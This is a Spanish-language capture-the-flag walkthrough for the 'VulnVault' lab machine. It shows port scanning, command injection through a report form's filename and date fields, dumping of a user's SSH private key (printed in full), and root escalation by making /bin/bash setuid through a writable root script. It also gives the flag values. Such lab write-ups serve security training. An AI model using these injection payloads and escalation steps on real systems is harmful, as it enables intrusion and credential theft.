---
icon: flag
---

# CTF VulnVault Intermediate

URL Download CTF = [https://drive.google.com/file/d/16mDWzuXi8n\_BijKp9dIWdr7OPb7LnDOy/view](https://drive.google.com/file/d/16mDWzuXi8n_BijKp9dIWdr7OPb7LnDOy/view)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip vulnvault.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh vulnvault.tar
```

Info:

```
___________________¶¶
____________________¶¶__¶_5¶¶
____________5¶5__¶5__¶¶_5¶__¶¶¶5
__________5¶¶¶__¶¶5¶¶¶¶¶5¶¶__5¶¶¶5
_________¶¶¶¶__¶5¶¶¶¶¶¶¶¶¶¶¶__5¶¶¶¶5
_______5¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶_5¶¶__5¶¶¶¶¶5
______¶¶¶¶¶5_¶¶¶¶¶¶¶¶¶¶¶¶¶5¶¶¶__¶¶¶¶5¶5
_____¶¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶5
____¶¶¶¶¶¶¶_¶¶¶5¶¶¶¶5_¶¶¶¶¶5_5¶_¶¶¶¶¶¶¶¶5
___¶¶¶¶¶¶¶¶__5¶¶¶¶¶¶5___5¶¶¶¶__5¶¶¶¶¶¶¶¶¶5
__¶¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶5__5¶¶5_5¶¶¶¶¶¶¶¶¶¶¶
_5¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶¶¶¶¶¶¶¶5
_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶
5¶¶¶¶¶¶¶¶¶¶¶¶5___5¶¶¶¶¶¶¶5__¶¶¶¶5_¶¶¶5_¶¶¶¶
¶¶¶¶¶¶¶¶_¶¶5_5¶5__¶¶¶¶¶¶¶¶¶5_5¶¶¶_5¶¶¶_5¶¶¶5
¶5¶¶¶¶¶5_¶¶_5¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶5_5¶¶_5¶¶¶_¶¶¶5
¶¶¶¶_¶¶__¶__¶¶¶¶¶¶5_5¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶¶_5¶¶¶
¶¶¶5_5¶______5¶¶5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶5_¶5¶
5¶¶____5¶¶¶¶5_____5¶¶¶¶¶¶¶5_¶¶¶¶¶5_¶__¶¶_5¶¶
_¶¶__5¶¶¶¶¶¶¶¶¶¶5____5¶¶¶¶¶¶_¶¶¶¶¶_____¶5_¶¶
_¶¶___5¶¶¶¶¶¶¶¶¶__________5¶5_¶¶¶¶¶____¶¶_¶¶
_¶¶_______5¶¶¶¶¶¶5____________¶¶¶¶¶_____¶_¶¶
_5¶5________5¶¶_¶¶¶¶5________5¶¶¶¶¶_______¶¶
__¶¶__________¶___¶¶¶¶¶5___5¶¶¶¶¶¶5_______¶5
__¶¶____________5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶________¶
___¶________________5¶¶¶¶¶¶¶¶5_¶¶
___¶__________5¶¶¶¶¶¶¶¶5¶¶¶5__5¶5
_____________________5¶¶¶5____¶5

                                           
 ##   ##    ##       ####   ###  ##  #######  ######   ####       ##     ######    #####  
 ##   ##   ####     ##  ##   ##  ##   ##   #   ##  ##   ##       ####     ##  ##  ##   ## 
 ##   ##  ##  ##   ##        ## ##    ## #     ##  ##   ##      ##  ##    ##  ##  #       
 #######  ##  ##   ##        ####     ####     #####    ##      ##  ##    #####    #####  
 ##   ##  ######   ##        ## ##    ## #     ## ##    ##   #  ######    ##  ##       ## 
 ##   ##  ##  ##    ##  ##   ##  ##   ##   #   ##  ##   ##  ##  ##  ##    ##  ##  ##   ## 
 ##   ##  ##  ##     ####   ###  ##  #######  #### ##  #######  ##  ##   ######    #####  
                                         

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.18.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-21 05:35 EDT
Nmap scan report for 172.18.0.2
Host is up (0.000026s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f5:4f:86:a5:d6:14:16:67:8a:8e:b6:b6:4a:1d:e7:1f (ECDSA)
|_  256 e6:86:46:85:03:d2:99:70:99:aa:70:53:40:5d:90:60 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Generador de Reportes - Centro de Operaciones
MAC Address: 02:42:AC:12:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.03 seconds
```

Vemos que hay un puerto `80`, si entramos en el vemos una pagina en la que hay mucha informacion pero vemos algo interesante y es que se pueden enviar reportes cosa que se queda reflejado en la pagina, probaremos a injectar comandos.

## Injeccion de comandos

Si injectamos comandos directamente no funciona, pero si concatenamos una palabra normal con un comando si sirve.

```shell
Nombre del archivo: test; ls -la
Fecha: 21-08-2024
```

Info:

```
Reporte: reporte_1724233112.txt

Archivo de reporte: /var/www/html/reportes/reporte_1724233112.txt
Nombre: test\
total 56
drwxr-xr-x 1 root     root     4096 Aug 20 20:23 .
drwxr-xr-x 1 root     root     4096 Aug 20 18:08 ..
-rw-r--r-- 1 root     root     4992 Aug 20 20:20 index.php
drwxr-xr-x 2 root     root     4096 Aug 20 20:07 old
drwxr-xr-x 1 www-data www-data 4096 Aug 21 11:38 reportes
-rw-r--r-- 1 root     root     1090 Aug 20 20:14 scripts.js
-rw-r--r-- 1 root     root     2693 Aug 20 20:12 styles.css
-rw-r--r-- 1 root     root     1215 Aug 20 20:23 styles_upload.css
-rw-r--r-- 1 root     root     2314 Aug 20 20:23 upload.html
-rw-r--r-- 1 root     root     1645 Aug 20 20:23 upload.js
-rw-r--r-- 1 root     root     1296 Aug 20 20:19 upload.php
Fecha: 21-08-2024
```

Si vemos el `passwd` veremos que hay un usuario llamado `samara` por lo que probaremos a ver si tiene alguna `id_rsa` que se pueda ver.

```shell
Nombre del archivo: test
Fecha: 21-08-2024; cat /home/samara/.ssh/id_rsa
```

Info:

```
Reporte: reporte_1724233200.txt

Archivo de reporte: /var/www/html/reportes/reporte_1724233200.txt
Nombre: test
Fecha: 21-08-2024\
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Por lo que vemos si tiene una `id_rsa` por lo que haremos lo siguiente.

## SSH con id\_rsa

```shell
nano id_rsa

#Dentro del nano
<CONTENIDO_DEL_ID_RSA>
```

Lo guardamos y ponemos los permisos adecuado.

```shell
chmod 600 id_rsa
```

```shell
ssh -i id_rsa samara@<IP>
```

Una vez hecho esto ya estariamos dentro de la maquina con el usuario `samara`, por lo que leeremos la flag.

> user.txt

```
030208509edea7480a10b84baca3df3e
```

## Escalate Privileges

Si vemos los procesos que se estan ejecutando en el servidor, veremos lo siguiente.

```shell
ps -aux
```

Info:

```
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1 31.4  0.0   2800  2432 ?        Ss   11:34   3:07 /bin/sh -c service ssh start && service apache2 start && while true; do /bin/bash /usr/local/bin/echo.sh; done
root          15  0.0  0.0  12020  4104 ?        Ss   11:34   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root          33  0.1  0.2 203452 21816 ?        Ss   11:34   0:01 /usr/sbin/apache2 -k start
www-data      38  0.0  0.1 204128 18072 ?        S    11:34   0:00 /usr/sbin/apache2 -k start
www-data      39  0.0  0.1 204120 17304 ?        S    11:34   0:00 /usr/sbin/apache2 -k start
www-data      40  0.0  0.1 203960 17048 ?        S    11:34   0:00 /usr/sbin/apache2 -k start
www-data      41  0.0  0.1 203960 16792 ?        S    11:34   0:00 /usr/sbin/apache2 -k start
www-data      42  0.0  0.1 204120 17560 ?        S    11:34   0:00 /usr/sbin/apache2 -k start
www-data   39685  0.0  0.1 203960 16792 ?        S    11:35   0:00 /usr/sbin/apache2 -k start
root      247494  0.0  0.0  14532  7440 ?        Ss   11:42   0:00 sshd: samara [priv]
samara    247616  0.4  0.0  14792  6452 ?        S    11:42   0:00 sshd: samara@pts/0
samara    247658  0.0  0.0   5016  3840 pts/0    Ss   11:42   0:00 -bash
samara    324898  0.0  0.0   9580  4992 pts/0    R+   11:44   0:00 ps -aux
```

Vemos que se esta ejecutando lo siguiente.

```
root 1 31.4  0.0   2800  2432 ?  Ss   11:34   3:07 /bin/sh -c service ssh start && service apache2 start && while true; do /bin/bash /usr/local/bin/echo.sh; done
```

Esta haciendo un blucle ejecutando `root` todo el rato en `bash` un script llamado `echo.sh`, por lo que veremos que hace eso.

> echo.sh

```shell
#!/bin/bash

echo "No tienes permitido estar aqui :(." > /home/samara/message.txt
```

Vemos que hace eso, pero si nos fijamos mejor en los permisos que tiene veremos lo siguiente.

```
-rwxrw-rw- 1 root root   82 Aug 20 18:18 echo.sh
```

Vemos que podemos editarlo, por lo que haremos lo siguiente.

```shell
nano echo.sh

#Dentro del nano
#!/bin/bash

chmod u+s /bin/bash
```

Lo guardamos y esperamos, una vez que se haya ejecutado comprobaremos que funciono.

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1446024 Mar 31 10:41 /bin/bash
```

Vemos que ha funcionado por lo que haremos lo siguiente para ser `root`.

```shell
bash -p
```

Con ejecutar eso ya seriamos `root` por lo que leeremos la flag.

> root.txt

```
640c89bbfa2f70a4038fd570c65d6dcc
```
